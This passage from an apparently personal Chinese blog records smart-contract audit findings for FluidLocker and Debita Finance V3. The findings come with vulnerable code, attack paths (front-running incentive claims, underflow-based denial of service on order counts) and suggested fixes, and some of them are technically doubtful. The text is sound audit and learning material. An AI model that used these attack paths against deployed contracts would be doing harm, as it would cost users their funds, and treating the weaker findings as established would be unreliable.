class="line">    uint128 oneEightyDays = 180 days;  </span><br><span class="line">    uint128 fiveFortyDays = 540 days;  </span><br><span class="line">  </span><br><span class="line">    uint256 sevenDaysPercent = _getUnlockingPercentage(sevenDays);  </span><br><span class="line">    uint256 thirtyDaysPercent = _getUnlockingPercentage(thirtyDays);  </span><br><span class="line">    uint256 ninetyDaysPercent = _getUnlockingPercentage(ninetyDays);  </span><br><span class="line">    uint256 oneEightyDaysPercent = _getUnlockingPercentage(oneEightyDays);  </span><br><span class="line">    uint256 fiveFortyDaysPercent = _getUnlockingPercentage(fiveFortyDays);  </span><br><span class="line">  </span><br><span class="line">    console.log(&quot;7 days unlock percentage:&quot;, sevenDaysPercent);  </span><br><span class="line">    console.log(&quot;30 days unlock percentage:&quot;, thirtyDaysPercent);  </span><br><span class="line">    console.log(&quot;90 days unlock percentage:&quot;, ninetyDaysPercent);  </span><br><span class="line">    console.log(&quot;180 days unlock percentage:&quot;, oneEightyDaysPercent);  </span><br><span class="line">    console.log(&quot;540 days unlock percentage:&quot;, fiveFortyDaysPercent);  </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>And the output is:</p><p>Ran 1 test for test&#x2F;FluidLocker.t.sol:FluidLockerTest<br>[PASS] test_getUnlockingPercentage() (gas: 19376)<br>Logs:<br>  7 days unlock percentage: 2000<br>  30 days unlock percentage: 2000<br>  90 days unlock percentage: 2000<br>  180 days unlock percentage: 2000<br>  540 days unlock percentage: 2000  </p><p>Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 11.22ms (886.54µs CPU time)  </p><p>Ran 1 test suite in 159.53ms (11.22ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)<br>Mitigation<br>Divide the current _getUnlockingPercentage calculations into batches to ensure proper truncation:</p><p>index f31ad92..f39a89a 100644  </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--- a/fluid/packages/contracts/src/FluidLocker.sol  </span><br><span class="line">+++ b/fluid/packages/contracts/src/FluidLocker.sol  </span><br><span class="line">@@ -382,13 +382,14 @@ contract FluidLocker is Initializable, ReentrancyGuard, IFluidLocker &#123;  </span><br><span class="line">     &#125;  </span><br><span class="line">   </span><br><span class="line">     function _getUnlockingPercentage(uint128 unlockPeriod) internal pure returns (uint256 unlockingPercentageBP) &#123;  </span><br><span class="line">-        unlockingPercentageBP = (  </span><br><span class="line">-            _PERCENT_TO_BP  </span><br><span class="line">-                * (  </span><br><span class="line">-                    ((80 * _SCALER) / Math.sqrt(540 * _SCALER)) * (Math.sqrt(unlockPeriod * _SCALER) / _SCALER)  </span><br><span class="line">-                        + 20 * _SCALER  </span><br><span class="line">-                )  </span><br><span class="line">-        ) / _SCALER;  </span><br><span class="line">+        // First calculate sqrt(unlockPeriod/_MAX_UNLOCK_PERIOD)  </span><br><span class="line">+        uint256 periodRatio = Math.sqrt((unlockPeriod * _SCALER) / _MAX_UNLOCK_PERIOD);  </span><br><span class="line">+  </span><br><span class="line">+        // Scale it to the range [20, 100]  </span><br><span class="line">+        uint256 percentage = 20 + ((80 * periodRatio) / Math.sqrt(_SCALER));  </span><br><span class="line">+  </span><br><span class="line">+        // Convert to basis points (multiply by 100)  </span><br><span class="line">+        unlockingPercentageBP = percentage * 100;  </span><br><span class="line">     &#125;  </span><br></pre></td></tr></table></figure><p>With the above change, the test output looks like this:</p><p>Ran 1 test for test&#x2F;FluidLocker.t.sol:FluidLockerTest<br>[PASS] test_getUnlockingPercentage() (gas: 18470)<br>Logs:<br>  7 days unlock percentage: 2900<br>  30 days unlock percentage: 3800<br>  90 days unlock percentage: 5200<br>  180 days unlock percentage: 6600<br>  540 days unlock percentage: 10000  </p><p>Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 11.90ms (1.07ms CPU time)  </p><p>Ran 1 test suite in 160.39ms (11.90ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)  </p><p>就是要对于计算，比如，先除后乘就会导致一些精度的损失，或者是计算太大，还有一种的实现方式就是写测试文件</p>]]></content>
      
      
      
        <tags>
            
            <tag> 审计报告 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sherlock-2024-11-debita Finance V3 审计报告</title>
      <link href="/2024/11/24/sherlock-2024-11-debita-Finance-V3/"/>
      <url>/2024/11/24/sherlock-2024-11-debita-Finance-V3/</url>
      
        <content type="html"><![CDATA[<h1 id="一"><a href="#一" class="headerlink" title="一"></a>一</h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>There is no verification of the incentives recipient, which allows anyone to impersonate other borrowers and claim their incentives.</p><h2 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h2><p>Vulnerable code:</p><p>2024-11-debita-finance-v3-HeYuan-33&#x2F;Debita-V3-Contracts&#x2F;contracts&#x2F;DebitaIncentives.sol</p><p>Line 203 in 1465ba6</p><p> IERC20(token).transfer(msg.sender, amountToClaim); </p><p>Using msg.sender to send rewards to the caller without performing a check allows an attacker to impersonate a borrower and claim their incentives . Additionally, we can see that the function claimIncentives：<br>2024-11-debita-finance-v3-HeYuan-33&#x2F;Debita-V3-Contracts&#x2F;contracts&#x2F;DebitaIncentives.sol</p><p>Lines 142 to 147 in 1465ba6</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function claimIncentives( </span><br><span class="line">    address[] memory principles, </span><br><span class="line">    address[][] memory tokensIncentives, </span><br><span class="line">    uint epoch </span><br><span class="line">) public &#123; </span><br><span class="line">    // get information </span><br></pre></td></tr></table></figure><p>As long as the attacker forwards another person’s parameter information, they can impersonate them and claim the incentives<br>Internal pre-conditions<br>The claimIncentives function is public</p><h2 id="External-pre-conditions"><a href="#External-pre-conditions" class="headerlink" title="External pre-conditions"></a>External pre-conditions</h2><p>No response</p><h2 id="Attack-Path"><a href="#Attack-Path" class="headerlink" title="Attack Path"></a>Attack Path</h2><ul><li>Alice has successfully borrowed tokens, and when she calls the claimIncentives function to claim the incentives, the transaction is packaged into the transaction pool.</li><li>Bob is always ready to monitor this transaction pool. Upon discovering Alice’s transaction, he can retrieve the transaction details (address[] memory principles, address[][] memory tokensIncentives, uint epoch), and then submit a higher gas fee for the same transaction, which will be processed first.</li><li>At this point, Bob impersonates Alice to claim her incentives. When Alice’s transaction is processed, she will be marked as having already claimed the incentives</li></ul><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>Borrowers are unable to claim the rewards they are entitled to.<br>A front-running transaction attack occurs.</p><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>No response</p><h2 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h2><p>Perform a check on the msg.sender calling the claimIncentives function.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function claimIncentives(</span><br><span class="line">    address[] memory principles,</span><br><span class="line">    address[][] memory tokensIncentives,</span><br><span class="line">    uint epoch,</span><br><span class="line">) public &#123;</span><br><span class="line">    // Ensure the caller is the borrower</span><br><span class="line">    require(msg.sender == borrower, &quot;Only the borrower can claim incentives&quot;);</span><br><span class="line"></span><br><span class="line">    // ... existing logic</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Ensure that this epoch ,the principal, and the borrower are correctly matched.</p><h1 id="二"><a href="#二" class="headerlink" title="二"></a>二</h1><h2 id="Summary-1"><a href="#Summary-1" class="headerlink" title="Summary"></a>Summary</h2><p>We all know that using transferFrom to send tokens lacks the security of using safeTransferFrom.</p><h2 id="Root-Cause-1"><a href="#Root-Cause-1" class="headerlink" title="Root Cause"></a>Root Cause</h2><p>Vulnerable code:</p><p>2024-11-debita-finance-v3-HeYuan-33&#x2F;Debita-V3-Contracts&#x2F;contracts&#x2F;DebitaIncentives.sol</p><p>Lines 269 to 274 in 1465ba6</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IERC20(incentivizeToken).transferFrom( </span><br><span class="line">    msg.sender, </span><br><span class="line">    address(this), </span><br><span class="line">    amount </span><br><span class="line">); </span><br><span class="line"></span><br><span class="line">require(amount &gt; 0, &quot;Amount must be greater than 0&quot;); </span><br></pre></td></tr></table></figure><p>We can see that using transferFrom to transfer tokens to a contract is somewhat unsafe. Additionally, the operation of checking whether the amount is zero after the transfer is a bit redundant.<br>If it returns a bool value to determine whether the transfer was successful, then the vulnerability in the code is that it doesn’t check whether transferFrom actually succeeded.</p><h2 id="Internal-pre-conditions"><a href="#Internal-pre-conditions" class="headerlink" title="Internal pre-conditions"></a>Internal pre-conditions</h2><p>No response</p><h2 id="External-pre-conditions-1"><a href="#External-pre-conditions-1" class="headerlink" title="External pre-conditions"></a>External pre-conditions</h2><p>No response</p><h2 id="Attack-Path-1"><a href="#Attack-Path-1" class="headerlink" title="Attack Path"></a>Attack Path</h2><p>No response</p><h2 id="Impact-1"><a href="#Impact-1" class="headerlink" title="Impact"></a>Impact</h2><p>Using transferFrom to transfer tokens is less secure than safeTransferFrom.<br>We cannot be sure if transferFrom successfully completed the transfer.<br>Checking if the amount is zero after the transfer is performed in the wrong order.</p><h2 id="PoC-1"><a href="#PoC-1" class="headerlink" title="PoC"></a>PoC</h2><p>No response</p><h2 id="Mitigation-1"><a href="#Mitigation-1" class="headerlink" title="Mitigation"></a>Mitigation</h2><p>Use the more secure safeTransferFrom for the token transfer.<br>Change the order of the check for whether the amount is zero.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">       // transfer the tokens</span><br><span class="line">      // IERC20(incentivizeToken).transferFrom(</span><br><span class="line">    //     msg.sender,</span><br><span class="line">   //    address(this),</span><br><span class="line">  //     amount</span><br><span class="line"> //  );</span><br><span class="line">//   require(amount &gt; 0, &quot;Amount must be greater than 0&quot;);</span><br><span class="line">     </span><br><span class="line">     require(amount &gt; 0, &quot;Amount must be greater than 0&quot;);</span><br><span class="line">     SafeERC20.safeTransferFrom(</span><br><span class="line">           IERC20(incentivizeToken),</span><br><span class="line">         msg.sender,</span><br><span class="line">         address(this),</span><br><span class="line">         amount</span><br><span class="line">     );</span><br></pre></td></tr></table></figure><h1 id="三"><a href="#三" class="headerlink" title="三"></a>三</h1><h2 id="Summary-2"><a href="#Summary-2" class="headerlink" title="Summary"></a>Summary</h2><p>In the addFunds function of the DebitaLendOffer-Implementation contract, there is no check on theamountbeing added.</p><h2 id="Root-Cause-2"><a href="#Root-Cause-2" class="headerlink" title="Root Cause"></a>Root Cause</h2><p>Valnerable code:</p><p>2024-11-debita-finance-v3-HeYuan-33&#x2F;Debita-V3-Contracts&#x2F;contracts&#x2F;DebitaLendOffer-Implementation.sol</p><p>Lines 168 to 173 in 1465ba6</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SafeERC20.safeTransferFrom( </span><br><span class="line">    IERC20(lendInformation.principle), </span><br><span class="line">    msg.sender, </span><br><span class="line">    address(this), </span><br><span class="line">    amount </span><br><span class="line">); </span><br></pre></td></tr></table></figure><p>As we can see, there is no check on the amount before the transfer, which allows the lender or owner to transfer zero tokens, wasting gas.</p><h2 id="Internal-pre-conditions-1"><a href="#Internal-pre-conditions-1" class="headerlink" title="Internal pre-conditions"></a>Internal pre-conditions</h2><p>No response</p><h2 id="External-pre-conditions-2"><a href="#External-pre-conditions-2" class="headerlink" title="External pre-conditions"></a>External pre-conditions</h2><p>No response</p><h2 id="Attack-Path-2"><a href="#Attack-Path-2" class="headerlink" title="Attack Path"></a>Attack Path</h2><p>If an attacker becomes a lender, they can repeatedly call the addFunds function, adding a large number of zero amounts to the DebitaLendOffer-Implementation contract, which prevents other lenders from adding their loan amounts.</p><h2 id="Impact-2"><a href="#Impact-2" class="headerlink" title="Impact"></a>Impact</h2><p>An attacker sends a large number of requests with a zero amount to the DebitaLendOffer-Implementation contract, consuming a lot of gas, which prevents legitimate lenders from adding loan amounts.<br>The DebitaLendOffer-Implementation contract will receive a large number of requests with a zero amount.</p><h2 id="PoC-2"><a href="#PoC-2" class="headerlink" title="PoC"></a>PoC</h2><p>No response</p><h2 id="Mitigation-2"><a href="#Mitigation-2" class="headerlink" title="Mitigation"></a>Mitigation</h2><p>Add a check to ensure the amount is not zero, as follows:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">require(amount &gt; 0, &quot;Amount must be greater than zero&quot;);</span><br><span class="line">SafeERC20.safeTransferFrom(</span><br><span class="line">       IERC20(lendInformation.principle),</span><br><span class="line">       msg.sender,</span><br><span class="line">       address(this),</span><br><span class="line">       amount</span><br><span class="line">   );</span><br></pre></td></tr></table></figure><h1 id="四"><a href="#四" class="headerlink" title="四"></a>四</h1><h2 id="Summary-3"><a href="#Summary-3" class="headerlink" title="Summary"></a>Summary</h2><p>Although the claimInterest function in the DebitaV3Loan.sol contract is marked as internal, there is still no check for the lender.</p><h2 id="Root-Cause-3"><a href="#Root-Cause-3" class="headerlink" title="Root Cause"></a>Root Cause</h2><p>Valnerable code:</p><p>2024-11-debita-finance-v3-HeYuan-33&#x2F;Debita-V3-Contracts&#x2F;contracts&#x2F;DebitaV3Loan.sol</p><p>Lines 259 to 269 in 1465ba6</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function claimInterest(uint index) internal &#123; </span><br><span class="line">    IOwnerships ownershipContract = IOwnerships(s_OwnershipContract); </span><br><span class="line">    infoOfOffers memory offer = loanData._acceptedOffers[index]; </span><br><span class="line">    uint interest = offer.interestToClaim; </span><br><span class="line"> </span><br><span class="line">    require(interest &gt; 0, &quot;No interest to claim&quot;); </span><br><span class="line"> </span><br><span class="line">    loanData._acceptedOffers[index].interestToClaim = 0; </span><br><span class="line">    SafeERC20.safeTransfer(IERC20(offer.principle), msg.sender, interest); </span><br><span class="line">    Aggregator(AggregatorContract).emitLoanUpdated(address(this)); </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>As we can see from above, there is no check for the lender, which could lead to the interest being incorrectly claimed.<br>By comparing it with the function that has the same functionality, we can see that:<br>2024-11-debita-finance-v3-HeYuan-33&#x2F;Debita-V3-Contracts&#x2F;contracts&#x2F;DebitaV3Loan.sol</p><p>Lines 288 to 311 in 1465ba6</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _claimDebt(uint index) internal &#123; </span><br><span class="line">    LoanData memory m_loan = loanData; </span><br><span class="line">    IOwnerships ownershipContract = IOwnerships(s_OwnershipContract); </span><br><span class="line"> </span><br><span class="line">    infoOfOffers memory offer = m_loan._acceptedOffers[index]; </span><br><span class="line">    require( </span><br><span class="line">        ownershipContract.ownerOf(offer.lenderID) == msg.sender, </span><br><span class="line">        &quot;Not lender&quot; </span><br><span class="line">    ); </span><br><span class="line">    require(offer.paid == true, &quot;Not paid&quot;); </span><br><span class="line">    require(offer.debtClaimed == false, &quot;Already claimed&quot;); </span><br><span class="line">    loanData._acceptedOffers[index].debtClaimed = true; </span><br><span class="line">    ownershipContract.burn(offer.lenderID); </span><br><span class="line">    uint interest = offer.interestToClaim; </span><br><span class="line">    offer.interestToClaim = 0; </span><br><span class="line"> </span><br><span class="line">    SafeERC20.safeTransfer( </span><br><span class="line">        IERC20(offer.principle), </span><br><span class="line">        msg.sender, </span><br><span class="line">        interest + offer.principleAmount </span><br><span class="line">    ); </span><br><span class="line"> </span><br><span class="line">    Aggregator(AggregatorContract).emitLoanUpdated(address(this)); </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>There still needs to be a check for the lender, as this would also serve as an additional layer of protection.</p><h2 id="Internal-pre-conditions-2"><a href="#Internal-pre-conditions-2" class="headerlink" title="Internal pre-conditions"></a>Internal pre-conditions</h2><p>No response</p><h2 id="External-pre-conditions-3"><a href="#External-pre-conditions-3" class="headerlink" title="External pre-conditions"></a>External pre-conditions</h2><p>No response</p><h2 id="Attack-Path-3"><a href="#Attack-Path-3" class="headerlink" title="Attack Path"></a>Attack Path</h2><p>No response</p><h2 id="Impact-3"><a href="#Impact-3" class="headerlink" title="Impact"></a>Impact</h2><p>This could lead to the interest being incorrectly claimed.</p><h2 id="PoC-3"><a href="#PoC-3" class="headerlink" title="PoC"></a>PoC</h2><p>No response</p><h2 id="Mitigation-3"><a href="#Mitigation-3" class="headerlink" title="Mitigation"></a>Mitigation</h2><p>Add a check for the lender, as follows:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function claimInterest(uint index) internal &#123;</span><br><span class="line">       IOwnerships ownershipContract = IOwnerships(s_OwnershipContract);</span><br><span class="line">       infoOfOffers memory offer = loanData._acceptedOffers[index];</span><br><span class="line">       uint interest = offer.interestToClaim;</span><br><span class="line"></span><br><span class="line">         require(</span><br><span class="line">           ownershipContract.ownerOf(offer.lenderID) == msg.sender,</span><br><span class="line">           &quot;Not lender&quot;</span><br><span class="line">       );</span><br><span class="line"></span><br><span class="line">       require(interest &gt; 0, &quot;No interest to claim&quot;);</span><br><span class="line"></span><br><span class="line">       loanData._acceptedOffers[index].interestToClaim = 0;</span><br><span class="line">       SafeERC20.safeTransfer(IERC20(offer.principle), msg.sender, interest);</span><br><span class="line">       Aggregator(AggregatorContract).emitLoanUpdated(address(this));</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h1 id="五"><a href="#五" class="headerlink" title="五"></a>五</h1><h2 id="Summary-4"><a href="#Summary-4" class="headerlink" title="Summary"></a>Summary</h2><p>In the payDebt function of the DebitaV3Loan.sol contract, after calculating the interest, the safe transfer does not ensure that the address receiving the interest is not the zero address.</p><h2 id="Root-Cause-4"><a href="#Root-Cause-4" class="headerlink" title="Root Cause"></a>Root Cause</h2><p>Vulnerable code:</p><p>2024-11-debita-finance-v3-HeYuan-33&#x2F;Debita-V3-Contracts&#x2F;contracts&#x2F;DebitaV3Loan.sol</p><p>Lines 243 to 248 in 1465ba6</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SafeERC20.safeTransferFrom( </span><br><span class="line">    IERC20(offer.principle), </span><br><span class="line">    msg.sender, </span><br><span class="line">    feeAddress, </span><br><span class="line">    feeOnInterest </span><br><span class="line">); </span><br></pre></td></tr></table></figure><p>As we can see from above, the safe transfer function of ERC20 is used, but it cannot ensure that feeOnInterest is not transferred to the zero address, resulting in irretrievable loss.</p><h2 id="Internal-pre-conditions-3"><a href="#Internal-pre-conditions-3" class="headerlink" title="Internal pre-conditions"></a>Internal pre-conditions</h2><h2 id="External-pre-conditions-4"><a href="#External-pre-conditions-4" class="headerlink" title="External pre-conditions"></a>External pre-conditions</h2><h2 id="Attack-Path-4"><a href="#Attack-Path-4" class="headerlink" title="Attack Path"></a>Attack Path</h2><p>No response</p><h2 id="Impact-4"><a href="#Impact-4" class="headerlink" title="Impact"></a>Impact</h2><p>The DebitaV3Loan.sol contract will lose the earned interest, which is a very unfortunate situation.</p><h2 id="PoC-4"><a href="#PoC-4" class="headerlink" title="PoC"></a>PoC</h2><p>No response</p><h2 id="Mitigation-4"><a href="#Mitigation-4" class="headerlink" title="Mitigation"></a>Mitigation</h2><p>Perform a zero address check on feeAddress as follows:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Check if feeAddress is the zero address</span><br><span class="line">  require(feeAddress != address(0), &quot;Invalid fee address: zero address&quot;);</span><br><span class="line"></span><br><span class="line">SafeERC20.safeTransferFrom(</span><br><span class="line">    IERC20(offer.principle),</span><br><span class="line">    msg.sender,</span><br><span class="line">    feeAddress,</span><br><span class="line">    feeOnInterest</span><br><span class="line">);\</span><br></pre></td></tr></table></figure><h1 id="六"><a href="#六" class="headerlink" title="六"></a>六</h1><h2 id="Summary-5"><a href="#Summary-5" class="headerlink" title="Summary"></a>Summary</h2><p>2024-11-debita-finance-v3-HeYuan-33&#x2F;Debita-V3-Contracts&#x2F;contracts&#x2F;DebitaBorrowOffer-Factory.sol</p><p>Lines 143 to 144 in 8d0c8c0</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint balance = IERC20(_collateral).balanceOf(address(borrowOffer)); </span><br><span class="line">require(balance &gt;= _collateralAmount, &quot;Invalid balance&quot;); </span><br></pre></td></tr></table></figure><p>In thecontract, it checks whether the balance of an IERC20 token has successfully met the required amount, but it does not check the balance of an IERC721 token. If the user uses an IERC721 token as collateral, this check will fail, and it is also uncertain whether the IERC721 token has successfully entered the contract.DebitaBorrowOffer-Factory.sol<br>Root Cause<br>It only checks if the collateral staked by the user is an IERC20 token, and confirms whether the DebitaBorrowOffer-Factory.sol contract has enough IERC20 tokens.<br>This is an incorrect check, as if _collateral is an IERC721 token, this check will cause the contract to fail.</p><h2 id="Internal-pre-conditions-4"><a href="#Internal-pre-conditions-4" class="headerlink" title="Internal pre-conditions"></a>Internal pre-conditions</h2><p>No response</p><h2 id="External-pre-conditions-5"><a href="#External-pre-conditions-5" class="headerlink" title="External pre-conditions"></a>External pre-conditions</h2><p>No response</p><h2 id="Attack-Path-5"><a href="#Attack-Path-5" class="headerlink" title="Attack Path"></a>Attack Path</h2><h2 id="Impact-5"><a href="#Impact-5" class="headerlink" title="Impact"></a>Impact</h2><p>An attacker could use an IERC721 token as collateral. When the attacker takes out a loan and deposits the IERC721 token as collateral, it will cause the transaction to fail. If the attacker repeatedly executes the same transaction, it could potentially cause the contract to become unresponsive.</p><p>A legitimate user attempting to use an IERC721 token as collateral for a loan will also encounter an error, preventing the transaction from being processed, which would break the functionality of the contract.</p><p>An attacker can use an IERC721 token as collateral without successfully transferring it to the contract, effectively enabling them to borrow funds without providing any actual collateral.</p><h2 id="PoC-5"><a href="#PoC-5" class="headerlink" title="PoC"></a>PoC</h2><p>No response</p><h2 id="Mitigation-5"><a href="#Mitigation-5" class="headerlink" title="Mitigation"></a>Mitigation</h2><p>To enhance the contract’s validation functionality, it should not only check if the IERC20 collateral has been successfully deposited into the DebitaBorrowOffer-Factory.sol contract, but also account for the case where the collateral is an IERC721 token. Below is the suggested modified code:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (_isNFT) &#123;</span><br><span class="line">    address nftOwner = IERC721(_collateral).ownerOf(_receiptID);</span><br><span class="line">    require(nftOwner == address(borrowOffer), &quot;NFT not transferred correctly&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    uint balance = IERC20(_collateral).balanceOf(address(borrowOffer));</span><br><span class="line">    require(balance &gt;= _collateralAmount, &quot;Invalid balance&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>感觉还是很难。就是发现不了他们的错误。这个合约的逻辑很缜密，所以只有等正确的审计报告出来，然后再多学习学习</p><h2 id="这次的审计，有让我学会一些东西，在函数中定义重复owner-会导致改变的量状态不同，比如这次的合约中，就错误的使用了owner"><a href="#这次的审计，有让我学会一些东西，在函数中定义重复owner-会导致改变的量状态不同，比如这次的合约中，就错误的使用了owner" class="headerlink" title="这次的审计，有让我学会一些东西，在函数中定义重复owner,会导致改变的量状态不同，比如这次的合约中，就错误的使用了owner;"></a>这次的审计，有让我学会一些东西，在函数中定义重复owner,会导致改变的量状态不同，比如这次的合约中，就错误的使用了owner;</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function changeOwner(address owner) public &#123;</span><br><span class="line">      require(msg.sender == owner, &quot;Only owner&quot;);</span><br><span class="line">      require(deployedTime + 6 hours &gt; block.timestamp, &quot;6 hours passed&quot;);</span><br><span class="line">      owner = owner;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>当你像改变合约的owner时，由于传递的参数和合约的状态变量owner一样，所以就是自己赋值<br>这里的 owner 参数与状态变量 owner 同名，这就导致了一个作用域的问题。<br>在 Solidity 中，函数参数的作用域优先于状态变量，这意味着在函数内部，owner 会首先指代函数的参数 address owner，而不是合约的状态变量 owner。<br>因此，owner &#x3D; owner; 只是将函数的参数 owner 赋值给它自己，并没有对链上的状态变量 owner 做任何修改。<br>详细解释<br>函数参数优先级： 当你在函数中定义一个与状态变量同名的参数时，函数会优先使用该参数，而不是状态变量。也就是说，在函数内部，owner 这个名字指代的是参数 address owner，而不是链上的状态变量。<br>赋值的行为：<br>owner &#x3D; owner; 这行代码看似是给状态变量 owner 赋值，但实际上它只是给函数参数 owner 赋值。由于函数参数和状态变量是不同的存储位置，这行代码并没有实际改变链上的状态变量。<br>在 Solidity 中，owner &#x3D; owner; 是一个 自我赋值，没有任何效果，除非你在这个赋值中显式地引用状态变量。</p><blockquote><p>状态变量（State Variables）：状态变量存储在区块链上，生命周期与合约相同，可以在整个合约中访问和修改。<br>函数参数（Function Arguments）：这些变量仅在函数执行期间有效，当函数执行完后，它们就不再存在。<br>局部变量（Local Variables）：在函数内部声明的变量，它们只在函数的执行期间有效。</p></blockquote><h2 id="可以通过执行存款，阻止借贷订单的取消"><a href="#可以通过执行存款，阻止借贷订单的取消" class="headerlink" title="可以通过执行存款，阻止借贷订单的取消"></a>可以通过执行存款，阻止借贷订单的取消</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function addFunds(uint amount) public nonReentrant &#123;  </span><br><span class="line">       require(  </span><br><span class="line">           msg.sender == lendInformation.owner ||  </span><br><span class="line">               IAggregator(aggregatorContract).isSenderALoan(msg.sender),  </span><br><span class="line">           &quot;Only owner or loan&quot;  </span><br><span class="line">       );  </span><br><span class="line">       SafeERC20.safeTransferFrom(  </span><br><span class="line">           IERC20(lendInformation.principle),  </span><br><span class="line">           msg.sender,  </span><br><span class="line">           address(this),  </span><br><span class="line">           amount  </span><br><span class="line">       );  </span><br><span class="line">       lendInformation.availableAmount += amount;  </span><br><span class="line">       IDLOFactory(factoryContract).emitUpdate(address(this));  </span><br><span class="line">   &#125;  </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function cancelOffer() public onlyOwner nonReentrant &#123;  </span><br><span class="line">        uint availableAmount = lendInformation.availableAmount;  </span><br><span class="line">        lendInformation.perpetual = false;  </span><br><span class="line">        lendInformation.availableAmount = 0;  </span><br><span class="line">@&gt;        require(availableAmount &gt; 0, &quot;No funds to cancel&quot;);  </span><br><span class="line">        isActive = false;  </span><br><span class="line">  </span><br><span class="line">        SafeERC20.safeTransfer(  </span><br><span class="line">            IERC20(lendInformation.principle),  </span><br><span class="line">            msg.sender,  </span><br><span class="line">            availableAmount  </span><br><span class="line">        );  </span><br><span class="line">        IDLOFactory(factoryContract).emitDelete(address(this));  </span><br><span class="line">@&gt;        IDLOFactory(factoryContract).deleteOrder(address(this));  </span><br><span class="line">        // emit canceled event on factory  </span><br><span class="line">    &#125;  </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  function deleteOrder(address _lendOrder) external onlyLendOrder &#123;  </span><br><span class="line">        uint index = LendOrderIndex[_lendOrder];  </span><br><span class="line">        LendOrderIndex[_lendOrder] = 0;  </span><br><span class="line">  </span><br><span class="line">        // switch index of the last borrow order to the deleted borrow order  </span><br><span class="line">        allActiveLendOrders[index] = allActiveLendOrders[activeOrdersCount - 1];  </span><br><span class="line">        LendOrderIndex[allActiveLendOrders[activeOrdersCount - 1]] = index;  </span><br><span class="line">  </span><br><span class="line">        // take out last borrow order  </span><br><span class="line">  </span><br><span class="line">        allActiveLendOrders[activeOrdersCount - 1] = address(0);  </span><br><span class="line">  </span><br><span class="line">@&gt;        activeOrdersCount--;  </span><br><span class="line">    &#125;  </span><br></pre></td></tr></table></figure><p>攻击者可以利用 addFunds 函数中缺失的活跃订单检查，向一个 非活跃的借贷订单 中添加资金。这样，攻击者可以通过以下步骤触发攻击：</p><p>攻击者创建一个借贷订单，并通过 DLOFactory::activeOrdersCount 增加活跃订单计数。<br>攻击者调用 cancelOffer 函数取消该借贷订单，并调用 deleteOrder 减少活跃订单计数。<br>然后，攻击者向该已取消的借贷订单中添加资金，成功绕过了 cancelOffer 中的检查，允许 addFunds 通过。<br>攻击者继续调用 cancelOffer，进一步将活跃订单计数减少。<br>最终，攻击者将 DLOFactory::activeOrdersCount 计数降为 0。<br>当 activeOrdersCount 为零时，后续调用 deleteOrder 或相关函数将因为算术下溢（underflow）而失败，导致后续功能无法正常执行。<br>根本原因<br>问题出在 DLOImplementation::addFunds 函数中，它没有检查订单是否处于活跃状态。正常情况下，只有活跃订单才能向其中添加资金。但是，由于缺少这一检查，攻击者可以向一个已经取消的订单中添加资金，从而绕过订单取消的逻辑。<br>这个漏洞就是需要结合逻辑一起看，看它的检查条件，能不能绕过然后发生攻击，这次主要看合约的实现漏洞了，没有发现逻辑上可以绕过的点</p><h2 id="没有统一单位（10-18-10-8）往往会出现计算错误"><a href="#没有统一单位（10-18-10-8）往往会出现计算错误" class="headerlink" title="没有统一单位（10^18,10^8）往往会出现计算错误"></a>没有统一单位（10^18,10^8）往往会出现计算错误</h2><h2 id="下溢的问题"><a href="#下溢的问题" class="headerlink" title="下溢的问题"></a>下溢的问题</h2><p>好遗憾，最开始的时候还注意了这个地方，但是想到solidity 8.0 之后会检查溢出的，就没有太注意，但是其实是有一个报错返回的，那么就可以使DOS攻击</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint256 alreadyUsedTime = block.timestamp - loanStartedAt;</span><br><span class="line">uint256 extendedTime = maxDeadline - alreadyUsedTime - block.timestamp;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alreadyUsedTime = currentTime - loanStartedAt = 1705190400 - 1704067200 = 1,123,200（大约13天）</span><br><span class="line">extendedTime = maxDeadline - alreadyUsedTime - currentTime = 1705276800 - 1,123,200 - 1705190400</span><br><span class="line">             = 1705276800 - 1706313600</span><br><span class="line">             = -1,036,800</span><br></pre></td></tr></table></figure><p>这个 extendedTime 